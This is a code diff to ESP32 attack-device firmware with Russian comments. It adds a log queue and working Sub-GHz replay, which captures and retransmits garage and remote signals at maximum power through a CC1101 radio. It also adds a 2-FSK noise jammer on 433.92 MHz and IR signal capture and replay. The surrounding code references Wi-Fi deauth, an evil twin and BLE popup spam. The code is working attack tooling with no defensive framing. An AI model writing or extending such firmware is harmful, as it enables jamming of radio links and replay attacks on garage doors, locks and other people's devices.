@@ -15,6 +15,7 @@
 
 #define CC1101_CS 10
 #define IR_RX_PIN 4
+#define IR_TX_PIN 5
 
 // ===== XOR CRYPT HELPER =====
 void XOR_crypt(uint8_t* data, size_t len) {
@@ -62,6 +63,36 @@ int deauthIndex = 0;
 bool bleJammerInitialized = false;
 bool sourAppleInitialized = false;
 unsigned long lastAppleSpamTime = 0;
+
+// ===== LOG QUEUE (Ring Buffer) =====
+#define LOG_QUEUE_SIZE 20
+#define LOG_QUEUE_SEND_INTERVAL 500
+String logQueue[LOG_QUEUE_SIZE];
+int logQueueHead = 0;
+int logQueueTail = 0;
+int logQueueCount = 0;
+unsigned long lastLogQueueSendTime = 0;
+bool logFlushPending = false;
+
+void enqueueLog(const String& msg) {
+  logQueue[logQueueHead] = msg;
+  logQueueHead = (logQueueHead + 1) % LOG_QUEUE_SIZE;
+  if (logQueueCount < LOG_QUEUE_SIZE) {
+    logQueueCount++;
+  } else {
+    // Буфер полон — сдвигаем tail (теряем самый старый)
+    logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
+  }
+}
+
+String dequeueLog() {
+  if (logQueueCount == 0) return "";
+  String msg = logQueue[logQueueTail];
+  logQueue[logQueueTail] = ""; // Освобождаем память строки
+  logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
+  logQueueCount--;
+  return msg;
+}
 
 // Apple BLE payloads for Sour Apple (iOS popup spam)
 const uint8_t blePayloads[][19] = {
@@ -123,7 +154,8 @@ float getBoardTemp() {
 }
 
 // ===== SEND LOGS TO MASTER =====
-void sendLogToMaster(const char* logMsg) {
+// Прямая отправка одного лога (для urgent и processLogQueue)
+void sendLogDirect(const char* logMsg) {
   if (!hasMasterMac) return;
   
   uint8_t primaryChan;
@@ -150,6 +182,47 @@ void sendLogToMaster(const char* logMsg) {
   }
   
   esp_wifi_set_channel(primaryChan, secondChan);
+}
+
+// Добавляет лог в очередь (или отправляет напрямую если urgent)
+void sendLogToMaster(const char* logMsg, bool urgent = false) {
+  if (!hasMasterMac) return;
+  
+  if (urgent) {
+    sendLogDirect(logMsg);
+    return;
+  }
+  
+  enqueueLog(String(logMsg));
+}
+
+// Отправляет все накопленные логи одним пакетом, разделяя \n
+void processLogQueue() {
+  if (logQueueCount == 0) return;
+  if (!hasMasterMac) return;
+  
+  // Собираем все логи в один пакет
+  String batch = "";
+  while (logQueueCount > 0) {
+    String msg = dequeueLog();
+    if (msg.length() == 0) continue;
+    
+    // Проверяем влезет ли в лимит logMsg (180 байт с учётом \n и \0)
+    if (batch.length() + msg.length() + 1 >= 179) {
+      // Отправляем текущий batch и начинаем новый
+      sendLogDirect(batch.c_str());
+      delay(5);
+      batch = msg;
+    } else {
+      if (batch.length() > 0) batch += "\n";
+      batch += msg;
+    }
+  }
+  
+  // Отправляем остаток
+  if (batch.length() > 0) {
+    sendLogDirect(batch.c_str());
+  }
 }
 
 // ===== LED STATUS BLINKER =====
@@ -699,7 +772,7 @@ void startBLEScan() {
   pBLEScan->setWindow(99);
   BLEScanResults *foundDevices = pBLEScan->start(5, false);
   if (!foundDevices) {
-    sendLogToMaster("[BLE] Scan failed!");
+    sendLogToMaster("[BLE] Scan failed!", true);
     return;
   }
   
@@ -807,7 +880,7 @@ void startGhzScan() {
   int channelRssiSum[14] = {0};
   
   if (n == WIFI_SCAN_FAILED) {
-    sendLogToMaster("[2.4GHz Scanner] WiFi scan failed!");
+    sendLogToMaster("[2.4GHz Scanner] WiFi scan failed!", true);
   } else if (n > 0) {
     for (int i = 0; i < n; i++) {
       yield();
@@ -926,7 +999,7 @@ void startSubGhzScan() {
   
   bool hwPresent = checkCC1101();
   if (!hwPresent) {
-    sendLogToMaster("[Sub-GHz Scanner] CC1101 not detected. Running demo scan...");
+    sendLogToMaster("[Sub-GHz Scanner] CC1101 not detected. Running demo scan...", true);
     float frequencies[] = {315.00, 433.92, 868.35};
     for (int i = 0; i < 3; i++) {
       char buf[64];
@@ -1013,13 +1086,401 @@ void startIRScan() {
   }
   
   if (!captured) {
-    sendLogToMaster("[IR Scanner] Scan timeout. No signal detected.");
+    sendLogToMaster("[IR Scanner] Scan timeout. No signal detected.", true);
   }
 }
 
-void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay requires CC1101"); }
-void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer requires CC1101"); }
-void startIRReplay() { sendLogToMaster("[Error] IR Replay requires IR-led"); }
+// ===== SUB-GHZ REPLAY (CC1101 RAW CAPTURE + PLAYBACK) =====
+#define SUBGHZ_BUF_SIZE 512
+uint8_t subghzBuf[SUBGHZ_BUF_SIZE];
+int subghzBufLen = 0;
+float subghzCapturedFreq = 0;
+
+// CC1101 strobe command
+void cc1101Strobe(uint8_t cmd) {
+  digitalWrite(CC1101_CS, LOW);
+  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
+  SPI.transfer(cmd);
+  SPI.endTransaction();
+  digitalWrite(CC1101_CS, HIGH);
+}
+
+// CC1101 read FIFO burst
+int cc1101ReadFIFO(uint8_t* buf, int maxLen) {
+  uint8_t rxBytes = readReg(0x3B | 0xC0); // RXBYTES (burst read status reg)
+  if (rxBytes & 0x80) { // overflow
+    cc1101Strobe(0x3A); // SFRX — flush RX FIFO
+    return -1;
+  }
+  int toRead = min((int)rxBytes, maxLen);
+  if (toRead <= 0) return 0;
+
+  digitalWrite(CC1101_CS, LOW);
+  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
+  SPI.transfer(0xFF); // RX FIFO burst read
+  for (int i = 0; i < toRead; i++) {
+    buf[i] = SPI.transfer(0);
+  }
+  SPI.endTransaction();
+  digitalWrite(CC1101_CS, HIGH);
+  return toRead;
+}
+
+// CC1101 write FIFO burst
+void cc1101WriteFIFO(const uint8_t* buf, int len) {
+  digitalWrite(CC1101_CS, LOW);
+  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
+  SPI.transfer(0x7F); // TX FIFO burst write
+  for (int i = 0; i < len; i++) {
+    SPI.transfer(buf[i]);
+  }
+  SPI.endTransaction();
+  digitalWrite(CC1101_CS, HIGH);
+}
+
+void cc1101ConfigASK_OOK() {
+  setCC1101_Idle();
+  delay(2);
+
+  // ASK/OOK, ~2.4 kBaud, 250kHz RX BW — широкий захват для пультов/гаражей
+  writeReg(0x02, 0x06); // IOCFG0: GDO0 = sync word
+  writeReg(0x08, 0x05); // PKTCTRL0: async serial mode, no CRC
+  writeReg(0x0B, 0x0C); // FSCTRL1: IF frequency
+  writeReg(0x10, 0xC7); // MDMCFG4: RX BW 250kHz
+  writeReg(0x11, 0x93); // MDMCFG3: data rate ~2.4kBaud
+  writeReg(0x12, 0x30); // MDMCFG2: ASK/OOK, no sync
+  writeReg(0x13, 0x00); // MDMCFG1: no FEC, 2 preamble
+  writeReg(0x15, 0x00); // DEVIATN: 0 for OOK
+  writeReg(0x18, 0x18); // MCSM0: auto-cal from idle
+  writeReg(0x19, 0x16); // FOCCFG
+  writeReg(0x1A, 0x6C); // BSCFG
+  writeReg(0x1B, 0x43); // AGCCTRL2
+  writeReg(0x1C, 0x40); // AGCCTRL1
+  writeReg(0x1D, 0x91); // AGCCTRL0
+  writeReg(0x21, 0x56); // FREND1
+  writeReg(0x22, 0x11); // FREND0: PA for OOK
+  writeReg(0x23, 0xE9); // FSCAL3
+  writeReg(0x24, 0x2A); // FSCAL2
+  writeReg(0x25, 0x00); // FSCAL1
+  writeReg(0x26, 0x1F); // FSCAL0
+  writeReg(0x29, 0x59); // FSTEST
+  writeReg(0x2C, 0x81); // TEST2
+  writeReg(0x2D, 0x35); // TEST1
+  writeReg(0x2E, 0x09); // TEST0
+}
+
+void startSubGhzReplay() {
+  if (!checkCC1101()) {
+    sendLogToMaster("[Sub-GHz Replay] CC1101 not detected!", true);
+    return;
+  }
+
+  // Частоты для сканирования (гаражи, пульты, датчики)
+  float scanFreqs[] = {433.92, 315.00, 868.35};
+  int numFreqs = 3;
+  bool captured = false;
+  subghzBufLen = 0;
+
+  sendLogToMaster("[Sub-GHz Replay] Listening for signal...");
+
+  // Фаза 1: ожидание сигнала на одной из частот
+  for (int f = 0; f < numFreqs && !captured; f++) {
+    float freq = scanFreqs[f];
+    char buf[80];
+    snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Scanning %.2f MHz...", freq);
+    sendLogToMaster(buf);
+
+    cc1101ConfigASK_OOK();
+    setCC1101_Frequency(freq);
+    cc1101Strobe(0x3A); // SFRX — flush RX
+    cc1101Strobe(0x34); // SRX — enter RX
+
+    delay(10); // дать PLL залочиться
+
+    // Слушаем до 5 секунд на каждой частоте
+    unsigned long listenStart = millis();
+    while (millis() - listenStart < 5000) {
+      esp_task_wdt_reset();
+      yield();
+
+      int rssi = getCC1101_RSSI();
+
+      // Порог обнаружения сигнала: RSSI > -70 dBm
+      if (rssi > -70) {
+        snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Signal detected! RSSI: %d dBm @ %.2f MHz", rssi, freq);
+        sendLogToMaster(buf);
+
+        // Захват данных из FIFO пока сигнал есть
+        unsigned long captureStart = millis();
+        subghzBufLen = 0;
+
+        while (millis() - captureStart < 2000 && subghzBufLen < SUBGHZ_BUF_SIZE) {
+          esp_task_wdt_reset();
+          int n = cc1101ReadFIFO(subghzBuf + subghzBufLen, SUBGHZ_BUF_SIZE - subghzBufLen);
+          if (n > 0) {
+            subghzBufLen += n;
+          } else if (n < 0) {
+            // overflow — flush и выходим
+            sendLogToMaster("[Sub-GHz Replay] RX FIFO overflow, using partial data", true);
+            break;
+          }
+          delay(1);
+        }
+
+        // Если ничего через FIFO не пришло — запись через GDO0 sampling
+        if (subghzBufLen == 0) {
+          sendLogToMaster("[Sub-GHz Replay] FIFO empty, sampling GDO0 pin...");
+          // Запись цифрового состояния пина как raw bitstream
+          unsigned long sampleStart = millis();
+          while (millis() - sampleStart < 1500 && subghzBufLen < SUBGHZ_BUF_SIZE) {
+            uint8_t byte = 0;
+            for (int bit = 7; bit >= 0; bit--) {
+              byte |= (digitalRead(2) & 1) << bit; // GDO0 = GPIO2 по умолчанию
+              delayMicroseconds(200); // ~5 kHz sample rate
+            }
+            subghzBuf[subghzBufLen++] = byte;
+            esp_task_wdt_reset();
+          }
+        }
+
+        subghzCapturedFreq = freq;
+        captured = true;
+        break;
+      }
+      delay(5);
+    }
+
+    setCC1101_Idle();
+  }
+
+  if (!captured || subghzBufLen == 0) {
+    sendLogToMaster("[Sub-GHz Replay] No signal captured. Try again closer to transmitter.", true);
+    setCC1101_Idle();
+    return;
+  }
+
+  char buf[80];
+  snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Captured %d bytes @ %.2f MHz. Replaying...", subghzBufLen, subghzCapturedFreq);
+  sendLogToMaster(buf);
+
+  // Фаза 2: воспроизведение 3 раза
+  for (int rep = 0; rep < 3; rep++) {
+    esp_task_wdt_reset();
+
+    setCC1101_Idle();
+    cc1101ConfigASK_OOK();
+    setCC1101_Frequency(subghzCapturedFreq);
+
+    // PA table для TX (максимальная мощность OOK)
+    writeReg(0x3E, 0xC0); // PATABLE[0] = max power
+
+    cc1101Strobe(0x3B); // SFTX — flush TX FIFO
+
+    // Записать данные в TX FIFO порциями (FIFO = 64 байта)
+    int offset = 0;
+    cc1101Strobe(0x35); // STX — enter TX
+
+    while (offset < subghzBufLen) {
+      int chunk = min(60, subghzBufLen - offset); // 60 чтобы не переполнить 64-байт FIFO
+      cc1101WriteFIFO(subghzBuf + offset, chunk);
+      offset += chunk;
+
+      // Ждём пока FIFO освободится (TXBYTES < 10)
+      unsigned long waitStart = millis();
+      while (millis() - waitStart < 200) {
+        uint8_t txBytes = readReg(0x3A | 0xC0); // TXBYTES
+        if ((txBytes & 0x7F) < 10) break;
+        delayMicroseconds(100);
+      }
+      esp_task_wdt_reset();
+    }
+
+    // Ждём завершение передачи
+    delay(50);
+    setCC1101_Idle();
+
+    snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Replay %d/3 sent", rep + 1);
+    sendLogToMaster(buf);
+    delay(200);
+  }
+
+  setCC1101_Idle();
+  sendLogToMaster("[Sub-GHz Replay] Done. Signal replayed 3 times.");
+}
+// ===== SUB-GHZ JAMMER (CC1101 2-FSK NOISE TX) =====
+bool subghzJammerInitialized = false;
+
+void cc1101Config2FSK_Jammer() {
+  setCC1101_Idle();
+  delay(2);
+
+  // 2-FSK, максимальная скорость передачи, широкая девиация
+  writeReg(0x02, 0x0D); // IOCFG0: serial clock
+  writeReg(0x08, 0x02); // PKTCTRL0: infinite packet length, no CRC
+  writeReg(0x06, 0xFF); // PKTLEN: max
+  writeReg(0x0B, 0x0C); // FSCTRL1: IF frequency
+  writeReg(0x10, 0x18); // MDMCFG4: RX BW widest, high data rate exponent
+  writeReg(0x11, 0xFF); // MDMCFG3: max data rate mantissa (~250 kBaud)
+  writeReg(0x12, 0x01); // MDMCFG2: 2-FSK, no sync
+  writeReg(0x13, 0x00); // MDMCFG1: no FEC
+  writeReg(0x15, 0x47); // DEVIATN: ~50 kHz deviation — широкая для глушения
+  writeReg(0x18, 0x18); // MCSM0: auto-cal from idle
+  writeReg(0x21, 0x56); // FREND1
+  writeReg(0x22, 0x10); // FREND0: PA setting index 0
+  writeReg(0x23, 0xE9); // FSCAL3
+  writeReg(0x24, 0x2A); // FSCAL2
+  writeReg(0x25, 0x00); // FSCAL1
+  writeReg(0x26, 0x1F); // FSCAL0
+  writeReg(0x3E, 0xC0); // PATABLE[0]: максимальная мощность TX
+}
+
+void startSubGhzJammerInit() {
+  if (!checkCC1101()) {
+    sendLogToMaster("[Sub-GHz Jammer] CC1101 not detected!", true);
+    attackRunning = false;
+    return;
+  }
+
+  cc1101Config2FSK_Jammer();
+  setCC1101_Frequency(433.92);
+  cc1101Strobe(0x3B); // SFTX — flush TX FIFO
+  cc1101Strobe(0x35); // STX — enter TX
+
+  subghzJammerInitialized = true;
+  sendLogToMaster("[Sub-GHz Jammer] Active on 433.92 MHz (2-FSK noise)");
+}
+
+void runSubGhzJammerStep() {
+  if (!subghzJammerInitialized) {
+    startSubGhzJammerInit();
+    if (!subghzJammerInitialized) return;
+  }
+
+  // Заполняем TX FIFO случайными байтами
+  uint8_t txBytes = readReg(0x3A | 0xC0); // TXBYTES status
+  if (txBytes & 0x80) {
+    // TX FIFO underflow — перезапуск
+    cc1101Strobe(0x3B); // SFTX
+    cc1101Strobe(0x35); // STX
+    return;
+  }
+
+  int freeSpace = 64 - (txBytes & 0x7F);
+  if (freeSpace >= 16) {
+    uint8_t noiseBuf[16];
+    for (int i = 0; i < 16; i++) {
+      noiseBuf[i] = (uint8_t)random(256);
+    }
+    cc1101WriteFIFO(noiseBuf, 16);
+  }
+
+  delayMicroseconds(50); // 50 мкс между записями
+
+  // Лог раз в 3 секунды
+  static unsigned long lastJamLog = 0;
+  if (millis() - lastJamLog >= 3000) {
+    lastJamLog = millis();
+    sendLogToMaster("[Sub-GHz Jammer] Transmitting noise on 433.92 MHz");
+  }
+}
+
+void stopSubGhzJammer() {
+  if (subghzJammerInitialized) {
+    setCC1101_Idle();
+    cc1101Strobe(0x3B); // SFTX
+    subghzJammerInitialized = false;
+    sendLogToMaster("[Sub-GHz Jammer] Stopped", true);
+  }
+}
+// ===== IR REPLAY (RAW CAPTURE + PLAYBACK) =====
+#define IR_BUF_MAX 256
+uint16_t irPulseBuf[IR_BUF_MAX]; // длительности импульсов в микросекундах
+int irPulseCount = 0;
+
+// 38kHz carrier burst на IR LED (mark)
+void irCarrierBurst(uint16_t us) {
+  unsigned long start = micros();
+  while (micros() - start < us) {
+    digitalWrite(IR_TX_PIN, HIGH);
+    delayMicroseconds(13); // полупериод 38kHz ≈ 13μs
+    digitalWrite(IR_TX_PIN, LOW);
+    delayMicroseconds(13);
+  }
+}
+
+void startIRReplay() {
+  pinMode(IR_RX_PIN, INPUT);
+  pinMode(IR_TX_PIN, OUTPUT);
+  digitalWrite(IR_TX_PIN, LOW);
+
+  irPulseCount = 0;
+  sendLogToMaster("[IR Replay] Point remote at receiver and press button...");
+
+  // Фаза 1: ожидание начала сигнала (до 8 секунд)
+  unsigned long waitStart = millis();
+  while (millis() - waitStart < 8000) {
+    esp_task_wdt_reset();
+    if (digitalRead(IR_RX_PIN) == LOW) break; // IR receiver active-low
+    delay(1);
+  }
+
+  if (digitalRead(IR_RX_PIN) != LOW) {
+    sendLogToMaster("[IR Replay] Timeout. No IR signal detected.", true);
+    return;
+  }
+
+  // Фаза 2: захват импульсов (mark/space чередование)
+  sendLogToMaster("[IR Replay] Signal detected, capturing...");
+
+  // Первый mark (LOW на выходе приёмника = IR carrier присутствует)
+  while (irPulseCount < IR_BUF_MAX) {
+    // Mark (IR carrier ON → receiver output LOW)
+    unsigned long mark = pulseIn(IR_RX_PIN, LOW, 65000);
+    if (mark == 0) break; // таймаут — конец сигнала
+    irPulseBuf[irPulseCount++] = (uint16_t)min(mark, 65535UL);
+
+    if (irPulseCount >= IR_BUF_MAX) break;
+
+    // Space (IR carrier OFF → receiver output HIGH)
+    unsigned long space = pulseIn(IR_RX_PIN, HIGH, 65000);
+    if (space == 0) break;
+    irPulseBuf[irPulseCount++] = (uint16_t)min(space, 65535UL);
+  }
+
+  if (irPulseCount < 4) {
+    sendLogToMaster("[IR Replay] Too few pulses captured. Try again.", true);
+    return;
+  }
+
+  char buf[80];
+  snprintf(buf, sizeof(buf), "[IR Replay] Captured %d pulses. Replaying 3 times...", irPulseCount);
+  sendLogToMaster(buf);
+
+  // Фаза 3: воспроизведение
+  for (int rep = 0; rep < 3; rep++) {
+    esp_task_wdt_reset();
+
+    for (int i = 0; i < irPulseCount; i++) {
+      if (i % 2 == 0) {
+        // Mark — передаём 38kHz carrier
+        irCarrierBurst(irPulseBuf[i]);
+      } else {
+        // Space — тишина
+        digitalWrite(IR_TX_PIN, LOW);
+        delayMicroseconds(irPulseBuf[i]);
+      }
+    }
+
+    digitalWrite(IR_TX_PIN, LOW);
+
+    snprintf(buf, sizeof(buf), "[IR Replay] Replay %d/3 sent", rep + 1);
+    sendLogToMaster(buf);
+    delay(100); // пауза между повторами
+  }
+
+  digitalWrite(IR_TX_PIN, LOW);
+  sendLogToMaster("[IR Replay] Done.");
+}
 
 // ===== RESTORE WIFI =====
 void restoreWiFiState() {
@@ -1039,6 +1500,13 @@ void stopAttack() {
   sourAppleInitialized = false;
   evilTwinStarted = false;
   lastStationCount = 0;
+  stopSubGhzJammer();
+
+  // Сброс очереди логов
+  logQueueHead = 0;
+  logQueueTail = 0;
+  logQueueCount = 0;
+  logFlushPending = false;
 
   WiFi.softAPdisconnect(true);
   if (BLEDevice::getAdvertising()) {
@@ -1174,7 +1642,7 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
 
   if (strcmp(myData.command, "start") == 0) {
     if (attackRunning) {
-      sendLogToMaster("[Warning] Attack already active");
+      sendLogToMaster("[Warning] Attack already active", true);
       Serial.println("Attack already active");
       return;
     }
@@ -1260,6 +1728,12 @@ void loop() {
   updateLedIndicator();
   esp_task_wdt_reset();
   
+  // Отправка накопленных логов каждые 500 мс
+  if (millis() - lastLogQueueSendTime >= LOG_QUEUE_SEND_INTERVAL) {
+    lastLogQueueSendTime = millis();
+    processLogQueue();
+  }
+  
   // Safety timeout: stop attack if Master connection is lost for >15 seconds
   if (attackRunning && hasMasterMac && (millis() - lastMasterHeardTime > 15000)) {
     Serial.println("Master connection timeout. Stopping attack.");
@@ -1338,7 +1812,7 @@ void loop() {
     else if (baseAttackName == "protokill") { currentAttack = "powerful_jammer"; attackRunning = true; }
     else if (baseAttackName == "subghz_scan") { startSubGhzScan(); attackRunning = false; currentAttack = ""; }
     else if (baseAttackName == "subghz_replay") { startSubGhzReplay(); attackRunning = false; currentAttack = ""; }
-    else if (baseAttackName == "subghz_jammer") { startSubGhzJammer(); attackRunning = false; currentAttack = ""; }
+    else if (baseAttackName == "subghz_jammer") { runSubGhzJammerStep(); }
     else if (baseAttackName == "ir_scan") { startIRScan(); attackRunning = false; currentAttack = ""; }
     else if (baseAttackName == "ir_replay") { startIRReplay(); attackRunning = false; currentAttack = ""; }
   }
